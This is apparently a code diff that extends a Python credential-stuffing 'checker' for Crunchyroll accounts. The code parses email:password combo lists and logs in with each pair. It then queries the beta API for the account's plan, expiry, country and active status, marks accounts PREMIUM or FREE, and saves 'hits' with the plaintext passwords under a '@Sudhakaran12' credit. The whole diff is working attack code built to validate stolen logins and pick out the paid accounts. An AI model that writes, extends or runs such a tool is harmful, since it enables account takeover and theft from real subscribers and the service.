@@ -102,8 +102,76 @@ class CrunchyrollChecker:
             if '"access_token"' not in response_text:
                 return {'status': 'INVALID', 'email': email}
             
-            # Full check logic (simplified for now)
-            return {'status': 'PREMIUM', 'email': email, 'password': password, 'plan': 'Unknown', 'expiry': 'N/A', 'country': 'Unknown'}
+            data = response.json()
+            access_token = data.get('access_token')
+            
+            if not access_token:
+                return {'status': 'INVALID', 'email': email}
+            
+            headers = {
+                'authorization': f'Bearer {access_token}',
+                'connection': 'Keep-Alive',
+                'host': 'beta-api.crunchyroll.com',
+                'user-agent': 'AppleCoreMedia/1.0.0.20L563 (Apple TV; U; CPU OS 16_5 like Mac OS X; en_us)'
+            }
+            
+            response = session.get('https://beta-api.crunchyroll.com/accounts/v1/me', headers=headers, timeout=15)
+            account_data = response.json()
+            
+            email_verified = account_data.get('email_verified', False)
+            created = account_data.get('created', '').split('T')[0]
+            external_id = account_data.get('external_id')
+            
+            response = session.get(f'https://beta-api.crunchyroll.com/subs/v1/subscriptions/{external_id}/products', headers=headers, timeout=15)
+            products_data = response.json()
+            
+            plan = "Free"
+            currency = "N/A"
+            subscribable = "False"
+            free_trial = "False"
+            
+            if 'items' in products_data and len(products_data['items']) > 0:
+                item = products_data['items'][0]
+                plan = item.get('product', {}).get('sku', 'Unknown')
+                currency = item.get('currency_code', 'N/A')
+                subscribable = str(item.get('product', {}).get('is_subscribable', False))
+                free_trial = str(item.get('active_free_trial', False))
+            
+            response = session.get(f'https://beta-api.crunchyroll.com/subs/v1/subscriptions/{external_id}', headers=headers, timeout=15)
+            sub_data = response.json()
+            
+            expiry = sub_data.get('next_renewal_date', 'N/A')
+            if expiry and 'T' in expiry:
+                expiry = expiry.split('T')[0]
+            
+            plan_duration = sub_data.get('cycle_duration', 'N/A')
+            is_active = str(sub_data.get('is_active', False))
+            country_code = sub_data.get('country_code', 'US')
+            country = self.countries.get(country_code, f"{country_code} 🌍")
+            is_cancelled = sub_data.get('is_cancelled', False)
+            
+            if is_cancelled or subscribable == "False" or "Subscription Not Found" in response.text:
+                status = "FREE"
+            elif subscribable == "True":
+                status = "PREMIUM"
+            else:
+                status = "FREE"
+            
+            return {
+                'status': status,
+                'email': email,
+                'password': password,
+                'email_verified': email_verified,
+                'account_creation_date': created,
+                'plan': plan,
+                'currency': currency,
+                'subscribable': subscribable,
+                'free_trial': free_trial,
+                'expiry': expiry,
+                'plan_duration': plan_duration,
+                'active': is_active,
+                'country': country
+            }
             
         except Exception:
             return {'status': 'ERROR', 'email': email}
@@ -115,6 +183,16 @@ def save_hit(result):
 EMAIL: {result['email']}
 PASSWORD: {result['password']}
 STATUS: {result['status']}
+EMAIL VERIFIED: {result.get('email_verified', 'N/A')}
+ACCOUNT CREATION: {result.get('account_creation_date', 'N/A')}
+PLAN: {result.get('plan', 'N/A')}
+CURRENCY: {result.get('currency', 'N/A')}
+SUBSCRIBABLE: {result.get('subscribable', 'N/A')}
+FREE TRIAL: {result.get('free_trial', 'N/A')}
+EXPIRY: {result.get('expiry', 'N/A')}
+PLAN DURATION: {result.get('plan_duration', 'N/A')}
+ACTIVE: {result.get('active', 'N/A')}
+COUNTRY: {result.get('country', 'N/A')}
 CHECKED BY: @Sudhakaran12
 {'='*70}
 """
@@ -124,6 +202,7 @@ CHECKED BY: @Sudhakaran12
 
 
 def clean_combo(line):
+    """Take ONLY email:password, ignore all messy text"""
     line = line.strip()
     if ':' not in line:
         return None
